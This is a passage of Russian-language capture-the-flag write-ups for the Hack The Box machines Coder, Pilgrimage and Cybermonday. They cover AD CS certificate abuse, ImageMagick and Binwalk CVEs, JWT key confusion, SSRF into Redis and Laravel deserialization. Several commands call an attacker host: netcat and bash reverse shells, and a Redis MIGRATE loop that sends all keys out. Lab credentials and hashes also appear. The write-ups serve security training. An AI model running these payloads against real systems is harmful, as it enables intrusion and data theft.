CreateDecryptor(Key, IV))
       {
        using (FileStream sourceFileStream = new FileStream(
sourceFile, FileMode.Open))
        {
         using (CryptoStream cryptoStream = new CryptoStream(
sourceFileStream, cryptoTransform, CryptoStreamMode.Read))
         {
           byte[] array = new byte[1024];
           int count;
           while ((count = cryptoStream.Read(array, 0, array.Length))
!= 0)
           {
            destFileStream.Write(array, 0, count);
           }
         }
        }
       }
     }
    }
    return null;
   }
 }
}





                Проверка расшифрованного файла

Это оказался архив 7-Zip, который содержит базу паролей KeePass и, пред-
положи тельно, файл-ключ.





                  Содержимое архива 7-Zip

А теперь расшифру ем и откроем базу паролей KeePass.





                    Расшифровка базы KeePass





                    Сох раненный зап рос бэкапа





                   Учетные данные пользовате ля s.blade





        Учетные дан ные пользователя s.blade для сервиса TeamCity




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



           РЕВЕРСИМ ШИФРОВАЛЬЩИК
          И ПРИМЕНЯЕМ ТЕХНИКУ ESC5





ÒÎ×ÊÀ ÎÏÎÐÛ

Первым  делом  про веряем  най денные  учетные  данные.  Так,  данные
для О365 оказались домен ными учет ными данными.


cme smb 10.10.11.207 -u 's.blade' -p 'AmcwNO60Zg3vca3o0HDrTC6D'
--shares





             Про верка учет ных данных на SMB-ресурсе

Нам удается авто ризо ваться на SMB. Теперь поп робуем получить доступ
к хосту, для чего проверим подключение к службе WinRM.


cme winrm 10.10.11.207 -u 's.blade' -p 'AmcwNO60Zg3vca3o0HDrTC6D'




             Проверка учетных данных на службе WinRM

Сессию получить не выйдет, поэто му перехо дим еще к одному най денному
ресурсу — сайту https://teamcity-dev.coder.htb. Не забываем обно вить
запись в файле /etc/hosts.


10.10.11.207 coder.htb dc01.coder.htb teamcity-dev.coder.htb





                 Фор ма авторизации TeamCity

TeamCity — это билд-сервер для обеспечения непрерывной интеграции
при разработ ке. Вво дим учет ные дан ные для платформы и натыкаемся
на двухфактор ную аутентификацию.





                Двухфакторная аутентифика ция TeamCity

У нас запрашивают шестизначный пароль, поп робу ем его пробрутить (воз-
можно, займет какое-то вре мя). Для перебо ра исполь зуем Burp Intruder.





                    Burp Intruder — вкладка Positions





                    Burp Intruder — вкладка Payloads





                   Burp Intruder — результат перебо ра

В ито ге можно отфильтро вать резуль таты по дли не или коду отве та и получить
один отличающийся. Вво дим этот код и получа ем дос туп к TeamCity.





                      Главная страница TeamCity


TeamCity RCE
Пе реходим к единственному проекту и выполняем сборку. Боль ше всего нас
интересуют логи сборки.





                     Логи сборки проекта

В логах видим путь к запускаемому скрип ту на PowerShell. Этот файл мы
можем най ти сре ди общих катало гов SMB.





             Содержимое проекта teamcity_test_repo

Хоть писать в файл на сервере мы не можем, но благодаря локаль ному дос-
тупу к git-репозиторию все же имеем воз можность выполнить свой код через
при менение  diﬀ-файла. В  локальный файл  hello_world.ps1 запишем
реверс-шелл на PowerShell, сге нерированный на сайте revshells.com.





                  Исходный файл на PowerShell





                 Изменен ный файл hello_world.ps1

Те перь выполняем git commit.


git commit hello_world.ps1 -m 'changed'





                   При мене ние изменений git

По лучим идентификаторы коммитов, для этого смотрим git log.


git log





                         Коммиты git

А теперь создадим diﬀ-файл, который будет содержать различия между ком-
митами.


git diff 4aefc d9899





                  Фор мирование diﬀ-фай ла

Вернемся к TeamCity и запус тим кастомную сбор ку, указав сформированный
diﬀ-файл. Предварительно запускаем лис тенер:


rlwrap nc -lnvp 4321





                     Кас томная сборка про екта

К сожале нию, реверс-шелл мы не получаем, а в логах сбор ки чита ем, что
обнаружено вре донос ное содер жимое скрипта.





                         Логи сборки

Я решил не патчить AMSI для работы с PowerShell, а пошел иным путем: прос-
то скачиваем на хост Windows-вер сию netcat и запус каем самый прос той
реверс-шелл. Для этого нужно сформировать новый diﬀ-файл.


curl http://10.10.14.83:80/nc64.exe -O .\nc64.exe
.\nc64.exe 10.10.14.83 4321 -e powershell

Повторяем все пред варяющие сборку действия и получаем бэкконнект.





                   Сессия пользователя coder


ÏÐÎÄÂÈÆÅÍÈÅ

По лучив доступ к файловой системе хос та, первым делом про веря ем осталь-
ные проекты, так как там могут быть цен ные данные. При этом важно заг-
лянуть в каталог C:\programdata.





           Содер жимое катало га C:\programdata\JetBrains

Находим уже зна комый нам проект, но он содержит много diﬀ-файлов.





  Со держимое катало га
  C:\programdata\JetBrains\TeamCity\system\changes

Большинство из них оказались моими попытками получить реверс-шелл,
но самый пер вый файл был создан давно. Про верим его содержимое.





               Содержимое фай ла 101.changes.diﬀ

Так находим файлы key.txt, enc.txt и Get-ADCS_Report.ps1. В скрипте
пароль  поль зователя  e.black  в  файле  enc.txt  расшифро вывается
с помощью клю ча key.txt. Сохраним файлы на локальный хост и расшифру-
ем пароль.


$key = Get-Content ./key.txt
$enc = Get-Content ./enc.txt | ConvertTo-SecureString -Key $key
(New-Object PSCredential 0, $enc).GetNetworkCredential().Password




                      Расшифрованный пароль

По лучаем пароль пользователя e.black и проверя ем его на ресур се SMB.


cme smb 10.10.11.207 -u 'e.black' -p 'ypOSJXPqlDOxxbQSfEERy300'



                   Результат тестирования SMB

Затем проверим учет ные дан ные для служ бы WinRM.


cme winrm 10.10.11.207 -u 'e.black' -p 'ypOSJXPqlDOxxbQSfEERy300'




                  Ре зультат тес тирования WinRM

Мы можем авторизоваться на хосте с помощью evil-winrm и получить сес-
сию поль зовате ля, а заодно и первый флаг.


evil-winrm -i 10.10.11.207 -u 'e.black' -p 'ypOSJXPqlDOxxbQSfEERy300'





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Те перь получим информацию о пользователе. Нас интересуют активные при-
вилегии и группы, в которых он сос тоит.


whoami /all





                  Информация о пользователе

И поль зователь состоит в груп пах Certicate Service DCOM Access и PKI
Admins, а это дает нам право на регистрацию шаблонов сер тификатов в служ-
бе сертификации Active Directory (AD CS) и на выпуск сертификатов. Эти усло-
вия позволя ют нам повысить привиле гии в домене. Применяемая нами тех-
ника называется ESC5.
  Давай  зарегис трируем  заранее   уязвимый  шаблон  сертифика та,
для которого при менима техника повышения при виле гий ESC1. Взять его
можно  на  GitHub.  А  регистрировать  шаб лон  будем  с  помощью
ADCSTemplate для груп пы PKI Admins.


Import-Module .\ADCSTemplate.psm1
New-ADCSTemplate -DisplayName RalfESC1 -JSON (Get-Content .\ESC1.json
 -Raw) -Publish -Identity "CODER\PKI Admins"



                   Ре гистра ция нового шаб лона

Те перь исполь зуем Certipy, что бы получить дан ные о центре сертификации
и существующих шаблонах.


certipy-ad find -username 'e.black@coder.htb' -password
'ypOSJXPqlDOxxbQSfEERy300'





           По луче ние информации о цен тре сер тифика ции





                   Зарегистрирован ный шаб лон

Видим соз данный нами шаблон сертификата и можем запросить выпуск сер-
тификата для поль зователя Administrator.


certipy-ad req -username 'e.black@coder.htb' -password
'ypOSJXPqlDOxxbQSfEERy300' -ca coder-DC01-CA -target 10.10.11.207
-template RalfESC1 -upn 'Administrator@coder.htb' -dns dc01.coder.htb





                 Запрос сертификата пользователя

Те перь у нас есть сер тификат, раз решающий аутен тификацию пользователя.
По это му сер тификату можем получить NTLM-хеш пароля пользователя
и выполнить атаку path the hash. Но есть маленький нюанс — нужно синхро-
низировать вре мя с удаленным сервером, используя команду ntpdate.


sudo timedatectl set-ntp 0
sudo ntpdate -s 10.10.11.207


certipy-ad auth -pfx administrator_dc01.pfx -dc-ip 10.10.11.207





            По лучение NTLM-хеша пароля пользовате ля

Те перь воз вращаем время своей машины обратно и подключаемся к серверу
по WMI с полученным хешем.


sudo timedatectl set-ntp 1
sudo ntpdate -s ntp.org


impacket-wmiexec coder.htb/administrator@dc01.coder.htb -hashes :
807726fcf9f188adc26eeafd7dc16bb7





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В этом райтапе я покажу, как восполь-
зоваться утилитой для работы с бинарными
фай лами Binwalk, что бы получить кон троль
над   Linux.  Но  сначала  попентестим
веб-сервер и про никнем на него благода ря             RalfHacker                                                                                             hackerralf8@gmail.com
неак курат ному использованию раз работ-
чиком утилиты ImageMagick.


Разбирать в этот раз будем тре нировочную машину Pilgrimage с пло щад ки
Hack The Box. Уро вень ее слож ности — «лег кий».




                     Под ключать ся к машинам с HTB рекомендуется
                        только через VPN. Не делай этого с компьютеров,
                        где есть важ ные для тебя данные, так как ты ока-
                    жешься в общей сети с другими учас тниками.



ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.219    pilgrimage.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Сканер нашел два открытых порта:
 • 22 — служба OpenSSH 8.4p1;
 • 80 — веб-сервер Nginx 1.18.0.

Также Nmap показал дос тупный каталог .git в корне сайта.





                        Главная стра ница сай та


ÒÎ×ÊÀ ÂÕÎÄÀ

Ис поль зуем ути литу git-dumper , что бы скачать весь репози торий.


git-dumper http://pilgrimage.htb/.git pilgrimage_git





                       Ло ги git-dumper

Для работы с git-репози тори ями я использую функцию «Система управле ния
версиями» в VS Code. В этом репозитории нашелся всего один ком мит —
начальный.





                      Ис тория ком митов

Пе реходим к анализу исходного кода сайта. Для регистрации и авторизации,
как мы узнали из файлов register.php и login.php, исполь зуется база дан-
ных SQLite.





                Со держимое файла register.php





                 Содержимое фай ла login.php

Ре гистрируемся на сай те, который предлага ет нам загрузить изображение,
чтобы уменьшить его. Версии «до» и «пос ле», веро ятно, будут показаны в таб-
лице ниже.





                    Главная страница пользователя

Давай заг лянем в исходный код фай ла index.php. Здесь обрабатывается
POST-зап рос, содержащий изоб ражение. Переданное изображение сох-
раняется на сервере и с помощью утилиты ImageMagick уменьшается вдвое.
Пос ле обработки пользовате лю предлага ют заг рузить новое изображение.





                 Со держимое файла index.php

Сам модуль ImageMagick тоже присутс тву ет в каталоге сай та. Нам нужно
узнать его версию, а затем поискать публично доступные эксплоиты. Мы
можем манипулиро вать входными дан ными, а это типичный источник угроз.


./magic -version





                 Версия программы ImageMagick

У нас версия ImageMagick 7.1.0-49, ищем в Google готовый экс плоит.





                   По иск экспло ита в Google




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



       ПОВЫШАЕМ ПРИВИЛЕГИИ ЧЕРЕЗ
              УЯЗВИМОСТЬ В BINWALK





ÒÎ×ÊÀ ÎÏÎÐÛ

При ложе ние ImageMagick 7.1.0-49 име ет уяз вимость CVE-2022-44268 — чте-
ние произвольного файла. Это даст нам воз можность получать содержимое
определен ных фай лов с удаленной системы. Причина уяз вимости заключа-
ется в том, что при изме нении размера изоб ражения ImageMagick будет
включать содер жимое профиля в создава емое изображение, при этом мы
можем манипулиро вать зна чением это го профиля. Можем, например, к кар-
тинке добавить чанк тексто вого типа (например, tEXt), содержащий ключ
и стро ку-значение. Если ключ — строка profile, то ImageMagick интерпре-
тирует значение как имя файла в системе и заг ружает его содер жимое
как необработанный профиль, после чего из нового изображения можно про-
читать этот профиль в HEX-фор мате.
  Для авто матического изме нения PNG исполь зуем эксплоит из репози-
тория voidz0r. Для про бы про чита ем файл /etc/passwd.


cargo run "/etc/passwd"





                 Соз дание изображения-наг рузки

Те перь загружа ем в веб-сервис созданное изображение-нагрузку, пос ле
чего получаем ссылку на новое изоб ражение, с изме ненным размером.





                 Результат обработки изоб ражения

Скачиваем полученный файл и находим в нем чанк с профилем.


wget http://pilgrimage.htb/shrunk/64a7e8f368191.png
identify -verbose 64a7e8f368191.png





             Профиль в преобразован ном приложе нии

Ис поль зуем CyberChef для декодирова ния шес тнад цатеричного значения
и получаем содержимое файла /etc/passwd, рас кры вающее нам список
поль зовате лей.





                Декоди рован ный файл /etc/passwd

Уязвимость под твердили, а зна чит, можем скачать и другие интерес ные фай-
лы. Нап ример, файл базы данных SQLite /var/db/pilgrimage, о котором мы
узнали из исходного кода. Здесь навер няка найдут ся учетные данные поль-
зователей сай та.





                  Про филь нового изображения





             Де кодированный файл /var/db/pilgrimage

Это «сырые» дан ные, в которых можно заб лудиться, поэтому активиру ем
еще одну функцию CyberChef, что бы отоб разить только строки.





                 Строки из фай ла /var/db/pilgrimage

Таким образом получаем учетные данных трех поль зователей. Нас интересу-
ет emily, пос кольку такой пользователь есть и в сис теме тоже. Пробуем под-
ключить ся к SSH с этим же паролем и забираем флаг поль зователя.





                       Флаг пользователя


ËÎÊÀËÜÍÎÅ ÏÎÂÛØÅÍÈÅ ÏÐÈÂÈËÅÃÈÉ

Те перь нам необ ходимо собрать информацию. Чтобы не тратить вре мя
на поиски и догадки, я в таких случаях использую скрипты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.



Заг рузим на хост скрипт для Linux, дадим пра во на выполнение и запустим
сканиро вание.
  В дереве про цес сов видим скрипт /usr/sbin/malwarescan.sh, запус-
кающий при ложе ние inotifywait.



                     Дерево процессов

В списке файлов, изменен ных за пос ледние пять минут, видим /var/www/
pilgrimage.htb/shrunk/malicious.pfs.  Этот же  каталог  передавался
inotifywait.





                  Последние изменен ные файлы

К тому же у нас есть право записи в каталог /var/www/pilgrimage.htb/
shrunk/ и фай лы в нем.





                 Фай лы, дос тупные для записи

Дальше я обыч но использую ути литу pspy64, которая выводит информа цию
о запущенных про цес сах. Так обнаружился периодический запуск скрипта /
usr/sbin/malwarescan.sh от име ни пользователя root.



                         Логи pspy64

Давай глянем, что это за скрипт.





               Содержимое фай ла malwarescan.sh

Здесь происхо дит вызов программы Binwalk, которой поочередно переда-
ются файлы из каталога /var/www/pilgrimage.htb/shrunk/. Проверим вер-
сию используемой программы и поищем экспло иты для нее.





                   Версия программы Binwalk





                  По иск эксплоита для Binwalk

По первой ссыл ке представлен эксплоит для уязвимости CVE-2022-4510.





                      Справка по экс пло иту

Эта версия Binwalk допускает обход катало га через функцию extractor
в модуле plugins/unpfs.py. Ког да Binwalk запус кается с параметром -e,
ата кующий может извлечь файлы, находя щиеся в любом каталоге файловой
системы. Най ден ный экспло ит создает файл, который при обработ ке извле-
кает   нагрузку   в   каталог  .config/binwalk/plugins.  Нагрузка —
это реверс-шелл, что дает нам возможность уда ленного выполнения кода.
Создаем такой файл и помещаем в каталог /var/www/pilgrimage.htb/
shrunk/.


python3 51249.py exp.png 10.10.14.46 4321





                   Соз дание фай ла с нагрузкой


         Со держимое катало га /var/www/pilgrimage.htb/shrunk/

Запускаем листенер (pwncat-cs -lp 4321) и получаем бэкконнект от име ни
рута.





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В этом райтапе я покажу, как зло умыш-
ленник может использовать неверную нас-
тройку  JSON  Web  Tokens  при  ата ке
на веб-сервер.  Так же про эксплуати руем
обход катало га в Nginx, получим дос туп             RalfHacker                                                                                             hackerralf8@gmail.com
к Redis благодаря SSRF и поупражняемся
в атаках, связанных с Docker.


Всё это — в рам ках зах вата трениро вочной машины Cybermonday с пло щад ки
Hack The Box. Уро вень ее — слож ный.


ÐÀÇÂÅÄÊÀ

Ñêàíèðîâàíèå ïîðòîâ
Добав ляем IP-адрес машины в /etc/hosts:


10.10.11.228 cybermonday.htb

И запускаем сканиро вание портов.




Сканиро вание портов — стандар тный первый шаг при любой атаке. Он поз-
воля ет атакующе му узнать, какие службы на хосте при нимают соединение.
На осно ве этой информации выбирается следующий шаг к получению точки
входа.
  Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи сле дующе го скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом про изво дится обычное быс трое ска-
нирование, на вто ром — более тщательное сканиро вание, с исполь зовани ем
име ющих ся скрип тов (опция -A).





                    Резуль тат работы скрипта

Nmap нашел все го два открытых порта: 22 — служба OpenSSH 8.4p1 и 80 —
веб-сервер Nginx 1.25.1.
  Откры ваем сайт и пытаемся определить, какие используются технологии.





                        Главная стра ница сай та

На сай те есть воз можность регистрации и авто ризации — сразу же зарегис-
трируемся. Это откроет нам доступ к новым функциям и расширит область
тес тирования.





            Главная стра ница авто ризо ванного пользователя

На сай те ничего интерес ного най ти не удалось, поэто му нужно про вести ска-
нирование в поисках скрытых возможностей и ресурсов.




Одно из пер вых действий при тес тировании безопасности веб-приложе-
ния — это сканиро вание методом перебо ра каталогов, чтобы найти скры тую
информацию и недоступные обыч ным посети телям функции. Для этого можно
использовать программы вроде dirsearch, DIRB или ﬀuf. Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -k — игнориро вать ошиб ки SSL;
 • -w — словарь (я использую сло вари из набора SecLists);
 • -t — количество потоков;
 • -d — глу бина сканирования.



Задаем все параметры и запускаем сканирование:


feroxbuster -k -u http://cybermonday.htb/ -t 16 -d 1 -w files_
interesting.txt





         Ре зультат ска нирования файлов с помощью feroxbuster

Нам дос тупно несколь ко инте ресных файлов. Увы, robots.txt оказался пус-
тым, однако из .htaccess узнаём нас трой ки дос тупа.


curl http://cybermonday.htb/.htaccess





                 Содержимое фай ла .htaccess


ÒÎ×ÊÀ ÂÕÎÄÀ

При тестировании формы авториза ции я обнаружил, что если попытаться
зарегистрировать вто рого пользовате ля на тот же почтовый ящик, то появит-
ся страница с ошибкой. Из нее мы выяснили, что сайт сде лан на фрей мворке
Laravel.





               Ошибка регистрации пользователя

Также здесь из-за неправильной нас тройки Nginx возможна уязвимость типа
Nginx Alias Traversal. Подробно я ее разбирал в райтапе по машине Pikaboo.
Попробуем подобрать имя фай ла, используя обход каталога /assets../.


feroxbuster -k -u http://cybermonday.htb/assets../ -t 8 -d 1 -w
files_interesting.txt





         Ре зультат ска нирования файлов с помощью feroxbuster

Находим много инте ресного, к примеру файл .env, содержащий настрой ки
служб.





                   Со держимое файла .env

Также дос тупен каталог .git, что дает нам воз можность получить исходные
коды сайта с помощью git-dumper.


mkdir git
git-dumper http://cybermonday.htb/assets../.git ./git

Работать с git-репози торием можно через VS Code.





                      Ис тория ком митов

Прос матри вая файлы сайта, узнаём о наличии роли isAdmin (строка 41).





                 Содержимое файла User.php

При этом в файле ProfileController.php при обновлении свойств профиля
поль зовате ля нет никакой проверки отправляемых парамет ров (строки 19–
33).





              Содержимое фай ла ProleController.php

Заходим на страницу обновления пользовательских настроек профиля,
отправ ляем данные и перехватываем с помощью Burp Intercept. Добав-
ляем параметр isAdmin=true и отправляем запрос дальше на сервер.





                    Перех ваченный запрос





                        Ответ сервера

Но получаем ошиб ку, из которой узнаём, что значение true не является
типом int. Не беда: пов торим отправку, но теперь с параметром isAdmin=1.





                    Перех ваченный запрос





                        Ответ сервера

В меню сайта появилась новая страница Dashboard, а значит, у нас получи-
лось поменять роль пользователя. Перей дем на новую страницу.





                        Стра ница Dashboard

На даш борде видим новую навигацион ную панель с пунктом Changelog. То
есть мы можем получить исто рию изме нений вер сий продукта. Там часто
встре чает ся важная информация. На этот раз находим ссыл ку на бета-вер-
сию сервиса под названием Webhook.





                        Страница Changelog




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



            ЭКСПЛУАТИРУЕМ ПУТАНИЦУ
                      КЛЮЧЕЙ JWT





ÒÎ×ÊÀ ÎÏÎÐÛ

Добав ляем най ден ный домен в файл /etc/hosts и выполняем запрос.


10.10.11.228 cybermonday.htb webhooks-api-beta.cybermonday.htb


curl http://webhooks-api-beta.cybermonday.htb | jq





                        Ответ сервера

В отве те получаем несколько конечных точек API, а также методы запросов
и необходимые параметры. Первым делом зарегис трируем поль зователя
и авторизуемся.





                     Регистрация в сер висе





                       Ав торизация в сервисе

В ответ получаем токен, который необ ходимо передавать в HTTP-заголовке
x-access-token.





                      Прос мотр веб-хуков

Я посмотрел другие API, и меня заин тересо вало дей ствие sendRequests, где
передаются URL-адрес и метод. Это потен циальный путь к SSRF. Определить
такое дей ствие можно при соз дании веб-хука, но создать его мы не можем,
так как поль зователь непривилегиро ванный. Давай подробнее посмотрим
на JWT.




JSON Web Token сос тоит из трех частей: заголовка (header), полез ной наг-
рузки (payload) и под писи. Заголовок и полезная нагрузка представляют
собой объекты JSON, при этом наг рузка может быть любой, это именно те
критически важ ные данные, которые передаются при ложе нию. Заголовок
содержит определенные поля:
 • alg — алгоритм, используемый для под писи/шифрования. Это обязатель-
  ный ключ;
 • typ — тип токена. Это поле должно иметь зна чение JWT.

Тре тий эле мент вычисляется на осно вании первых и зависит от выбранного
алго ритма. Токены могут быть перекодированы в компактное пред став ление:
к заголов ку и полезной нагрузке применя ется алгоритм Base64-URL, после
чего добавляется под пись и все три элемен та разделяются точками.
  Разобрать JWT можно с помощью расширения JWT Editor.





                  Декодированный заголо вок

В поле данных видим параметр role, отвечающий за при вилегии. Также я
обратил вни мание на использование асимметричного алгоритма шиф-
рования RS256. Еще иног да серверы предоставляют свои откры тые ключи
как объекты JSON Web Key через стандар тные URI /jwks.json или /.well-
known/jwks.json. Про верим, нет ли их на сервере.





                  Открытые JWK-клю чи сервера

Так мы получаем сце нарий, когда задан ста тичес кий ключ.


Àòàêà ïóòàíèöû êëþ÷åé
Предполагается, что будут обрабатываться исклю чительно токены, подписан-
ные с использованием асим метрич ного алго ритма RS256. Но если обмен
токенами реали зован неверно, то сервер, получив токен, подписанный
при помощи симметрич ного алго ритма HS256, будет рас смат ривать откры-
тый ключ как секрет HMAC. Таким обра зом ата кующий может под писать
токен, исполь зуя HS256 и откры тый ключ, а сервер будет исполь зовать тот же
откры тый ключ для проверки под писи! Этот метод называется «атака путани-
цы клю чей».
   Если у тебя установлен Burp с расширением JWT Editor, выпол нить эту ата-
ку будет просто. Первым делом копируем ключ из jwks.json, в меню Burp
переходим к JWT Editor и выбира ем опцию New RSA Key. В открывшееся
окош ко и встав ляем скопиро ванный ключ.





                      Расширение JWT Editor

Затем перек лючаем формат клю ча на PEM и задаем его идентификатор, пос-
ле чего сох раняем пре обра зованный ключ. В таб лице кешированных ключей
уви дим толь ко что соз данный.





                     Преобразование клю ча





                      Расширение JWT Editor

Те перь возвращаемся к вкладке Burp Repeater и переходим в режим прос-
мотра JSON Web Token. В заголовке JWT меняем алго ритм на HS256, а в
поле данных ставим роль admin. После вне сения изменений перехо дим
к пункту меню Attack → HMAC Key Confusion и в появившемся окошке выбира-
ем соз данный ранее ключ.





                Burp Repeater — режим JSON Web Token

Пос ле подтверждения ключа получаем новый JWT.





                Burp Repeater — режим JSON Web Token

Пе реходим обратно в режим просмотра Raw и отправ ляем запрос с новым
JWT.





                        Ответ сервера

Статус отве та — success, а значит, ата ка про веде на успешно. Теперь у нас
есть высокие привиле гии на сайте.


SSRF
Так как при виле гии повышены, создадим новый веб-хук.


{
    "name":"ralf_test",
    "description":"test",
    "action":"sendRequest"
}





                       Создание веб-хука

Те перь запустим локальный веб-сервер:


python3 -m http.server 80

И обратимся к соз данному хуку, чтобы получить запрос на наш сервер.
В парамет рах нужно передать адрес и метод для выполнения запроса.


{
    "url":"http://10.10.16.25/test_webhook",
    "method":"GET"
}





                        Запрос к веб-хуку





                      Ло ги веб-сервера

Не обхо димо узнать, задан ли список раз решен ных методов. Для это го вмес-
то веб-сервера запускаем листенер netcat и указываем случайный метод.





                        Запрос к веб-хуку





                       Логи листенера

В фай ле .env мы нашли парамет ры для Redis, поэто му попробуем обратиться
к СУБД и выполнить запрос к сво ему тес товому листенеру. Для этого исполь-
зуем команду REPLICAOF.


{
    "url":"http://redis:6379",
    "method":"REPLICAOF 10.10.16.25 6379\r\n\r\n"
}





                       Логи листенера

Зап рос приходит, а зна чит, мы можем поп робовать поработать с базой дан-
ных на сервере.


Redis
Те перь давай эксфильтруем все содержимое базы, для чего сначала уста-
новим и запустим на своем хосте redis-server.


sudo apt isntall redis-server
redis-server --loglevel verbose --protected-mode no

Те перь отправ ляем зап рос для переноса каж дого ключа с исходного экзем-
пляра на наш.


{
    "url":"http://redis:6379",
    "method":"EVAL 'for key,val in pairs(redis.call("KEYS","*")) do
redis.pcall("MIGRATE","10.10.16.69","6379",val,0,1000) end' 0\r\n\r\n
"
}

Под клю чаемся к своему серверу и прос матриваем данные.


redis-cli
keys *





                         Ключи Redis

База хра нит сессии Laravel. Просматривая зна чения по ключам, получаем
сери ализованные данные сес сий.




                         Данные Redis

Внимание привлекает параметр token, используемый на странице авториза-
ции.





                  Ис ходный код страницы login

Этот параметр и поможет определить нашу сессию. Снова авторизу емся
на сай те, получим ключи с сер вера и найдем сес сию с нашим токеном.


                        Значение сес сии


Laravel RCE
Так как Laravel переда ет данные сессии в сериализованном формате, контро-
лируя эти данные, мы можем записать такой гаджет, который при десериали-
зации выпол нит вре донос ный код. Чтобы получить возможность переза писи
данных сессий, мы можем настро ить репликацию дан ных СУБД с нашего сер-
вера на удаленный.


{
    "url":"http://redis:6379",
    "method":"REPLICAOF 10.10.16.69 6379\r\n\r\n"
}

Пос ле выполнения зап роса  к серверу проверим настрой ки репликации
на локальном хосте.


info replication





                Нас трой ки репликации данных Redis

Находим в параметрах удаленный сервер, но это еще не всё. Теперь на уда-
ленном сер вере разрешим перезапись дан ных.


{
    "url":"http://redis:6379/",
    "method":"CONFIG SET replica-read-only no\r\n\r\n"
}

Когда СУБД настроена, можно перейти к фор мированию наг рузки. В случае
с Java и .NET обычно исполь зуют десериализатор ysoserial, аналогичный есть
и для PHP. Сери ализовать будем самый простой реверс-шелл.


phpggc -f -a Laravel/RCE16 system 'bash -c "bash -i >& /dev/tcp/10.
10.16.69/4321 0>&1 2<&1"'





                       Соз дание нагрузки

Те перь запус каем листенер (pwncat-cs -lp 4321) и перезаписываем дан-
ные в Redis:


set 'laravel_session:aySh4jUKXBxA6PxcD5gmlH2zqL4Q7iCAlKTxuUAm' 'a:
2........i:7;}'

Пос ле обновле ния страницы на сай те моментально получаем уда ленную сес-
сию в тер минале pwncat-cs.





                  Сессия поль зователя www-data




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ



            ЭКСПЛУАТИРУЕМ ПУТАНИЦУ
                      КЛЮЧЕЙ JWT





ÏÐÎÄÂÈÆÅÍÈÅ

Те перь нам нужно собрать информа цию. Я буду использовать для этого
скрип ты PEASS.




Что делать после того, как мы получи ли доступ в систему от имени поль-
зователя? Вари антов дальнейшей эксплуата ции и повышения при виле гий
может быть очень мно го, как в Linux, так и в Windows. Чтобы соб рать
информацию и наметить цели, мож но исполь зовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скрип тов, которые проверяют сис-
тему на автомате и выдают подробный отчет о потенциально интерес ных
файлах, про цессах и настрой ках.


Заг рузим на хост скрипт для Linux, дадим пра во на выполнение и запустим
сканиро вание.
  В выводе из инте ресного — только информа ция об интерфейсах.





                  Информация об интерфей сах

Так как мы работаем в Kubernetes, прос канируем сеть на наличие живых хос-
тов.


nmap -sn 172.18.0.0/24





                   Результат ска ниро вания сети

По име нам хос тов понятно, где какие службы работают. Чтобы получить дос-
туп к этим хос там, нужно постро ить тун нель. Для этого будем использовать
инструмент Chisel. На локаль ном хос те запус тим сервер, ожидающий подклю-
чения (параметр --reverse) на порт 5432 (параметр -p).


./chisel.bin server -p 5432 --reverse

Те перь на удаленном хос те запустим кли ент скую часть. Указываем адрес сер-
вера и порт для подклю чения, а также тип туннеля — socks.


./ch client 10.10.16.69:5432 R:socks

В логах сервера должны увидеть сообщение о создании сессии.





                      Ло ги сер вера Chisel

На хос те 172.18.0.2 развернут Docker Registry. Давай определим, на каких
пор тах. Для работы через туннель будем исполь зовать proxychains, для чего
в файл кон фигураций /etc/proxychains.conf добавим запись socks5 127.
0.0.1 1080. Когда все готово, сканируем типичные для службы порты:


proxychains -q nmap -p5000-5002 -Pn 172.18.0.2





                  Результат ска ниро вания пор тов

Те перь исполь зуем DockerRegistryGrabber, что бы получить список репози-
ториев.


proxychains -q python3 DockerGraber.py --list http://172.18.0.2





                  Образы Docker Registry

А теперь сдампим все содержимое cybermonday_api.


proxychains -q python3 DockerGraber.py --dump_all http://172.18.0.2





                 Дамп всех данных репози тория

Файлов очень много, и их анализ займет мно го вре мени, поэтому сначала
про верим содер жимое базы данных.


proxychains -q mysql -h 172.18.0.7 -u root -proot


show databases;





                    Существующие базы данных

Из всех баз представ ляют интерес cybermonday и webhooks_api. В каждой
из баз находим таблицы с данными пользователей и получаем все данные.


use cybermonday;
show tables;
select * from users;





                   Данные из базы cybermonday


use webhooks_api;
show tables;
select * from users;
select * from webhooks;





                   Данные из базы webhooks_api

Хеши Bcrypt нам ничего не дали, а что могут дать веб-хуки, тоже пока неясно.
Теперь вернемся к скачанным из Docker Registry архи вам. В одном из них
находим исходные коды сервиса.





                    Содержимое архива


Arbitrary File Read
В исходном коде веб-приложения находим секретный ключ API, а сре ди
